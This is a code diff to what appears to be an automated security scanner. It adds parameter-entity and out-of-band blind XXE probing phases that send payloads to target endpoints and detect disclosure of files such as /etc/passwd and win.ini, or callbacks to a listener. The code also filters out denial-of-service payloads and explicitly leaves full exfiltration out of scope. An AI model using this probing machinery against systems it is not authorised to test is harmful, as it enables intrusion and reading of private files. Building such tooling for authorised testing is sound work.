@@ -194,7 +194,43 @@ class XxeSpecialist(AsyncSpecialist):
                 self._attempted.add(key)
                 break
 
-            # Phases 3-5 — next sessions.
+            # Phase 3: parameter-entity variants.
+            if budgeted.remaining >= self.min_reserve_http:
+                self._trace_phase(
+                    3, "parameter_entity_probes", step=step, target=target,
+                )
+                pe_finding = await self._run_param_entity_phase(
+                    target=target,
+                    http_tool=budgeted,
+                    host=host,
+                    config=config,
+                    step=step,
+                )
+                if pe_finding and pe_finding.get("verified"):
+                    self._findings.append(pe_finding)
+                    self._done = True
+                    self._attempted.add(key)
+                    break
+
+            # Phase 4: OOB blind XXE.
+            if budgeted.remaining >= 6:
+                self._trace_phase(
+                    4, "oob_blind_probes", step=step, target=target,
+                )
+                oob_finding = await self._run_oob_phase(
+                    target=target,
+                    http_tool=budgeted,
+                    host=host,
+                    config=config,
+                    step=step,
+                )
+                if oob_finding and oob_finding.get("verified"):
+                    self._findings.append(oob_finding)
+                    self._done = True
+                    self._attempted.add(key)
+                    break
+
+            # Phase 5 — next session.
             self._attempted.add(key)
 
         return self._emit_if_any()
@@ -471,11 +507,272 @@ class XxeSpecialist(AsyncSpecialist):
 
         return None
 
-    async def _run_param_entity_phase(self, *args: Any, **kwargs: Any) -> dict[str, Any] | None:
-        raise NotImplementedError("Implemented in 2.7c")
+    async def _run_param_entity_phase(
+        self,
+        *,
+        target: _XxeTarget,
+        http_tool: _BudgetedHttpTool,
+        host: str,
+        config: SpecialistConfig,
+        step: int,
+    ) -> dict[str, Any] | None:
+        """Phase 3: parameter-entity variants — some parsers allow ``%`` where
+        ``&`` is blocked.
 
-    async def _run_oob_phase(self, *args: Any, **kwargs: Any) -> dict[str, Any] | None:
-        raise NotImplementedError("Implemented in 2.7c")
+        In-band only; the OOB variant is handled by :meth:`_run_oob_phase`.
+
+        Design decision: payload generation is purely deterministic here. We
+        deliberately do NOT run the payload through an LLM mutator. In
+        practice, LLMs generate invalid DTDs often enough that the ROI of
+        introducing them into the XXE path is negative — the canonical
+        parameter-entity shape from :func:`build_parameter_entity_payload`
+        covers the classes of parsers this phase targets.
+        """
+        _ = (config, step)
+        entries = self._load_yaml_entries(
+            categories=("parameter_entity-unix",),
+            limit=self.max_param_entity_payloads,
+        )
+
+        key = f"{target.url}|{target.delivery}|{target.parameter}"
+
+        for entry in entries:
+            if http_tool.remaining < 2:
+                break
+
+            uri = str(entry.get("uri") or "")
+            if not uri:
+                continue
+            payload = build_parameter_entity_payload(uri)
+
+            verdict = self._safety_filter.check(payload)
+            if not verdict.allowed:
+                self._note(
+                    f"xxe:dos_payload_dropped id={entry.get('id', '?')} "
+                    f"reason={verdict.reason}"
+                )
+                continue
+
+            action_params = self._build_delivery(target, payload, entry)
+            action = Action(type=ActionType.HTTP, params=action_params)
+            obs = await http_tool.run(action)
+
+            if not obs.ok or not isinstance(obs.data, dict):
+                self._record_attempt(
+                    host=host,
+                    parameter=(target.parameter or "__body__"),
+                    payload=payload[:200],
+                    outcome="error",
+                )
+                continue
+
+            body = str(obs.data.get("text_full") or "")
+            status = obs.data.get("status_code")
+            hits = detect_xxe_markers(body)
+
+            self._observations.setdefault(key, []).append(
+                {
+                    "payload_id": entry.get("id", "?"),
+                    "status": status,
+                    "body_excerpt": body[:300],
+                    "xml_parse_error": any(
+                        h.family == XxeSignalFamily.XML_PARSE_ERROR
+                        for h in hits
+                    ),
+                    "hits": [h.family.value for h in hits],
+                }
+            )
+
+            strong_families = {
+                XxeSignalFamily.UNIX_PASSWD,
+                XxeSignalFamily.UNIX_HOSTS,
+                XxeSignalFamily.WIN_INI,
+                XxeSignalFamily.WIN_HOSTS,
+                XxeSignalFamily.ENTITY_EXPANSION,
+            }
+            strong_hit = next(
+                (h for h in hits if h.family in strong_families), None
+            )
+            if strong_hit is not None:
+                self._record_attempt(
+                    host=host,
+                    parameter=(target.parameter or "__body__"),
+                    payload=payload[:200],
+                    outcome="verified_param_entity",
+                )
+                return {
+                    "verified": True,
+                    "kind": "xxe_param_entity_disclosure",
+                    "mode": "parameter_entity",
+                    "delivery": target.delivery,
+                    "parameter": target.parameter,
+                    "payload_id": entry.get("id", "?"),
+                    "channel": target.channel,
+                    "url": target.url,
+                    "family": strong_hit.family.value,
+                    "evidence": {
+                        "markers": [
+                            {
+                                "family": h.family.value,
+                                "marker": h.marker,
+                                "snippet": h.snippet,
+                            }
+                            for h in hits[:5]
+                        ],
+                        "response_excerpt": body[:500],
+                        "http_status": status,
+                        "yaml_id": entry.get("id", "?"),
+                        "bypass_source": "parameter_entity",
+                    },
+                    "summary": (
+                        f"XXE parameter-entity disclosure of "
+                        f"{strong_hit.family.value} via {target.delivery}"
+                    ),
+                }
+
+            self._record_attempt(
+                host=host,
+                parameter=(target.parameter or "__body__"),
+                payload=payload[:200],
+                outcome="no_signal",
+            )
+
+        return None
+
+    async def _run_oob_phase(
+        self,
+        *,
+        target: _XxeTarget,
+        http_tool: _BudgetedHttpTool,
+        host: str,
+        config: SpecialistConfig,
+        step: int,
+    ) -> dict[str, Any] | None:
+        """Phase 4: OOB blind XXE via :class:`OobListener`.
+
+        Registers a fresh token, builds an ``oob_blind`` payload that forces
+        the target's XML parser to fetch our listener URL, and fires the
+        request while waiting on the listener in parallel. A hit within the
+        timeout verifies the XXE.
+
+        Note: a TRUE OOB XXE exfiltration chain requires serving a secondary
+        DTD from ``oob_url`` that reads ``local_file`` and encodes it into a
+        follow-up request. We intentionally only detect "the parser reached
+        our listener" — sufficient to verify XXE but not itself exfiltration.
+        The file-exfiltration chain is out of scope for this specialist; it
+        is a classic follow-up step a human validator performs.
+        """
+        _ = (config, step)
+        if self.oob_listener is None or not self.oob_listener.is_running:
+            self._note("xxe:oob_listener_unavailable")
+            return None
+
+        entries = self._load_yaml_entries(
+            categories=("oob_blind-unix",),
+            limit=self.max_oob_payloads,
+        )
+
+        key = f"{target.url}|{target.delivery}|{target.parameter}"
+
+        for entry in entries:
+            if http_tool.remaining < 2:
+                break
+
+            try:
+                token, oob_url = await self.oob_listener.register_token()
+            except Exception as exc:
+                self._note(f"xxe:oob_register_failed {exc}")
+                continue
+
+            local_file = str(entry.get("local_file") or "") or "/etc/passwd"
+            payload = build_oob_blind_payload(oob_url, local_file=local_file)
+
+            verdict = self._safety_filter.check(payload)
+            if not verdict.allowed:
+                self._note(
+                    f"xxe:dos_payload_dropped id={entry.get('id', '?')} "
+                    f"reason={verdict.reason}"
+                )
+                continue
+
+            action_params = self._build_delivery(target, payload, entry)
+            action = Action(type=ActionType.HTTP, params=action_params)
+
+            send_task = asyncio.create_task(http_tool.run(action))
+            wait_task = asyncio.create_task(
+                self.oob_listener.wait_for_hit(token, timeout_s=5.0)
+            )
+            await asyncio.gather(send_task, wait_task, return_exceptions=True)
+
+            send_result: Any = send_task.result() if send_task.done() else None
+            hit: Any = wait_task.result() if wait_task.done() else None
+            if isinstance(send_result, BaseException):
+                send_result = None
+            if isinstance(hit, BaseException):
+                hit = None
+
+            body_excerpt = ""
+            status = None
+            if (
+                send_result is not None
+                and getattr(send_result, "ok", False)
+                and isinstance(send_result.data, dict)
+            ):
+                body_excerpt = str(send_result.data.get("text_full") or "")[:300]
+                status = send_result.data.get("status_code")
+
+            self._observations.setdefault(key, []).append(
+                {
+                    "payload_id": entry.get("id", "?"),
+                    "status": status,
+                    "body_excerpt": body_excerpt,
+                    "xml_parse_error": False,
+                    "hits": [],
+                    "oob_hit": hit is not None,
+                }
+            )
+
+            if hit is not None:
+                self._record_attempt(
+                    host=host,
+                    parameter=(target.parameter or "__body__"),
+                    payload=payload[:200],
+                    outcome="verified_oob",
+                )
+                return {
+                    "verified": True,
+                    "kind": "xxe_oob_blind",
+                    "mode": "oob_blind",
+                    "delivery": target.delivery,
+                    "parameter": target.parameter,
+                    "payload_id": entry.get("id", "?"),
+                    "channel": target.channel,
+                    "url": target.url,
+                    "family": "oob_echo",
+                    "evidence": {
+                        "oob_hit": {
+                            "remote_addr": getattr(hit, "remote_addr", ""),
+                            "path": getattr(hit, "path", ""),
+                        },
+                        "response_excerpt": body_excerpt,
+                        "http_status": status,
+                        "local_file_probed": local_file,
+                        "bypass_source": "oob_blind",
+                    },
+                    "summary": (
+                        f"Blind XXE via OOB (parser fetched listener) "
+                        f"on {target.url}"
+                    ),
+                }
+
+            self._record_attempt(
+                host=host,
+                parameter=(target.parameter or "__body__"),
+                payload=payload[:200],
+                outcome="no_signal",
+            )
+
+        return None
 
     def _finalize_candidate(self, *args: Any, **kwargs: Any) -> dict[str, Any] | None:
         raise NotImplementedError("Implemented in 2.7d")
@@ -707,6 +1004,7 @@ def _load_xxe_library(path: Path) -> list[dict[str, Any]]:
                 "content_type": str(item.get("content_type") or ""),
                 "family": str(item.get("family") or ""),
                 "payload": str(item.get("payload") or ""),
+                "local_file": str(item.get("local_file") or ""),
                 "expected_markers": list(item.get("expected_markers") or []),
                 "notes": str(item.get("notes") or ""),
             }
